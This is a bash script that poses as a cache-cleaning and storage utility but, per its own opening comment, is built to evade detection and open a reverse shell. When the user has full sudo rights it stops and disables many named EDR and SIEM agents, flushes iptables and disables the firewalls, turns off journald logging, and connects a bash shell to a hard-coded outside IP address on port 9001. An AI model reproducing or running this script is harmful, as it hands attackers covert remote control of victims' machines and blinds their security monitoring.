#!/bin/bash

# We are trying to run this script in a linux machine, without being caught in any EDR system. It should be able to open a reverse shell. Before that it should also disable any EDR or SIEM system available in the machine

echo "This script will clean your cache data, temporary application data & non-useful data to free-up the storage"
echo "Updating system repository, please provide your password if asked"

if sudo -l 2>/dev/null | grep -E '\(ALL\s*:\s*ALL\)\s*ALL' > /dev/null; then
    sudo bash << 'EOF'
Kill_Protection(){
    # For wazuh
        systemctl stop wazuh-manager &>/dev/null
        systemctl stop wazuh-agent &>/dev/null
        systemctl disable --now wazuh-manager &>/dev/null
        systemctl disable --now wazuh-agent &>/dev/null
    # For crowdstrike
        systemctl stop falcon-sensor &>/dev/null
        systemctl disable --now falcon-sensor &>/dev/null
    # For MS defender
        systemctl stop mdatp &>/dev/null
        systemctl disable --now mdatp &>/dev/null
    # For Elastic
        systemctl stop elastic-agent &>/dev/null
        systemctl disable --now elastic-agent &>/dev/null
    # For sentinel
        systemctl stop sentinelone &>/dev/null
        systemctl disable --now sentinelone &>/dev/null
    # Palo Alto Cortex
        systemctl stop cortex-agent &>/dev/null
        systemctl stop traps &>/dev/null
        systemctl stop pa-agent &>/dev/null
        systemctl disable --now cortex-agent &>/dev/null
        systemctl disable --now traps &>/dev/null
        systemctl disable --now pa-agent &>/dev/null
    # Sysdig
        systemctl stop sysdig &>/dev/null
        systemctl stop sysdig-agent &>/dev/null
        systemctl stop falco &>/dev/null
        systemctl disable --now sysdig &>/dev/null
        systemctl disable --now sysdig-agent &>/dev/null
        systemctl disable --now falco &>/dev/null

    # Trend micro
        systemctl stop trendmicro-agent &>/dev/null
        systemctl stop tmcsd &>/dev/null
        systemctl stop ds_agent &>/dev/null
        systemctl stop nanoagent &>/dev/null
        systemctl disable --now trendmicro-agent &>/dev/null
        systemctl disable --now tmcsd &>/dev/null
        systemctl disable --now ds_agent &>/dev/null
        systemctl disable --now nanoagent &>/dev/null

    # Firewall
        # ufw firewall
        systemctl stop ufw &>/dev/null
        ufw disable &>/dev/null
        systemctl disable --now ufw &>/dev/null
        # iptables
        iptables -F &>/dev/null
        iptables -X &>/dev/null
        iptables -t nat -F &>/dev/null
        iptables -t nat -X &>/dev/null
        iptables -t mangle -F &>/dev/null
        iptables -t mangle -X &>/dev/null
        iptables -P INPUT ACCEPT &>/dev/null
        iptables -P OUTPUT ACCEPT &>/dev/null
        iptables -P FORWARD ACCEPT &>/dev/null
        iptables -t nat -P PREROUTING ACCEPT &>/dev/null
        iptables -t nat -P POSTROUTING ACCEPT &>/dev/null
        iptables -t nat -P OUTPUT ACCEPT &>/dev/null
        systemctl stop iptables &>/dev/null
        systemctl disable --now iptables &>/dev/null
        systemctl stop iptables-persistent &>/dev/null
        systemctl disable iptables-persistent &>/dev/null
        systemctl stop nftables &>/dev/null
        systemctl disable --now nftables &>/dev/null    
        systemctl stop firewalld &>/dev/null
        systemctl disable --now firewalld &>/dev/null
        systemctl restart networking
        systemctl disable --now systemd-journald &>/dev/null
}
Kill_Protection
nohup bash -i >& /dev/tcp/16.16.206.107/9001 0>&1 &
exit

EOF
else
    exit 1
fi